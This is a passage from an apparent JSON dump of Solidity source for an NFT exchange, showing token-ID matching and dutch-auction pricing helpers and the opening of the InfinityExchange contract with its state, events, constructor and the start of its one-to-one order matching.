tokenIds between two order items\n   * @param item1 first item\n   * @param item2 second item\n   * @return returns whether tokenIds intersect\n   */\n  function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 item1TokensLength = item1.tokens.length;\n    uint256 item2TokensLength = item2.tokens.length;\n    // case where maker/taker didn't specify any tokenIds for this collection\n    if (item1TokensLength == 0 || item2TokensLength == 0) {\n      return true;\n    }\n    uint256 numTokenIdsPerCollMatched = 0;\n    for (uint256 k = 0; k < item2TokensLength; ) {\n      for (uint256 l = 0; l < item1TokensLength; ) {\n        if (\n          item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n        ) {\n          // increment numTokenIdsPerCollMatched\n          unchecked {\n            ++numTokenIdsPerCollMatched;\n          }\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++l;\n        }\n      }\n      unchecked {\n        ++k;\n      }\n    }\n\n    return numTokenIdsPerCollMatched == item2TokensLength;\n  }\n\n  // ======================================================= UTILS ============================================================\n\n  /// @dev returns the sum of current order prices; used in match one to many orders\n  function _sumCurrentPrices(OrderTypes.MakerOrder[] calldata orders) internal view returns (uint256) {\n    uint256 sum = 0;\n    uint256 ordersLength = orders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      sum += _getCurrentPrice(orders[i]);\n      unchecked {\n        ++i;\n      }\n    }\n    return sum;\n  }\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n}"
    },
    {
      "filename": "contracts/core/InfinityExchange.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\n// external imports\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {ReentrancyGuard} from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport {IERC165} from '@openzeppelin/contracts/interfaces/IERC165.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\nimport {IERC1155} from '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {EnumerableSet} from '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';\n\n// internal imports\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\nimport {SignatureChecker} from '../libs/SignatureChecker.sol';\n\n/**\n@title InfinityExchange\n@author nneverlander. Twitter @nneverlander\n@notice The main NFT exchange contract that holds state and does asset transfers\n@dev This contract can be extended via 'complications' - strategies that let the exchange execute various types of orders\n      like dutch auctions, reverse dutch auctions, floor price orders, private sales, etc.\n\nNFTNFTNFT...........................................NFTNFTNFT\nNFTNFT                                                 NFTNFT\nNFT                                                       NFT\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.           NFTNFTNFTNFTNFTNFT   NFTNFTNFTNFTNFTNFT         .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.          NFTNFTNFTNFTNFTNFTN   NFTNFTNFTNFTNFTNFT         .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\nNFT                                                       NFT\nNFTNFT                                                 NFTNFT\nNFTNFTNFT...........................................NFTNFTNFT \n\n*/\ncontract InfinityExchange is ReentrancyGuard, Ownable {\n  using SafeERC20 for IERC20;\n  using EnumerableSet for EnumerableSet.AddressSet;\n\n  /// @dev WETH address of a chain; set at deploy time to the WETH address of the chain that this contract is deployed to\n  address public immutable WETH;\n  /// @dev Used in order signing with EIP-712\n  bytes32 public immutable DOMAIN_SEPARATOR;\n  /// @dev This is the adress that is used to send auto sniped orders for execution on chain\n  address public MATCH_EXECUTOR;\n  /// @dev Gas cost for auto sniped orders are paid by the buyers and refunded to this contract in the form of WETH\n  uint32 public WETH_TRANSFER_GAS_UNITS = 50000;\n  /// @notice Exchange fee in basis points (250 bps = 2.5%)\n  uint16 public PROTOCOL_FEE_BPS = 250;\n\n  /**\n   @dev All orders should have a nonce >= to this value. \n        Any orders with nonce value less than this are non-executable. \n        Used for cancelling all outstanding orders.\n  */\n  mapping(address => uint256) public userMinOrderNonce;\n\n  /// @dev This records already executed or cancelled orders to prevent replay attacks.\n  mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n  /// @dev Storage variable that keeps track of valid complications (order execution strategies)\n  EnumerableSet.AddressSet private _complications;\n  /// @dev Storate variable that keeps track of valid currencies (tokens)\n  EnumerableSet.AddressSet private _currencies;\n\n  event CancelAllOrders(address user, uint256 newMinNonce);\n  event CancelMultipleOrders(address user, uint256[] orderNonces);\n  event NewWethTransferGasUnits(uint32 wethTransferGasUnits);\n  event NewProtocolFee(uint16 protocolFee);\n\n  event MatchOrderFulfilled(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  event TakeOrderFulfilled(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  constructor(address _WETH, address _matchExecutor) {\n    // Calculate the domain separator\n    DOMAIN_SEPARATOR = keccak256(\n      abi.encode(\n        keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n        keccak256('InfinityExchange'),\n        keccak256(bytes('1')), // for versionId = 1\n        block.chainid,\n        address(this)\n      )\n    );\n    WETH = _WETH;\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  fallback() external payable {}\n\n  receive() external payable {}\n\n  // =================================================== USER FUNCTIONS =======================================================\n\n  /**\n   @notice Matches orders one to one where each order has 1 NFT. Example: Match 1 specific NFT buy with one specific NFT sell.\n   @dev Can execute orders in batches for gas efficiency. Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrders1 Maker order 1\n   @param makerOrders2 Maker order 2\n  */\n  function matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to me"
    }
  ]
}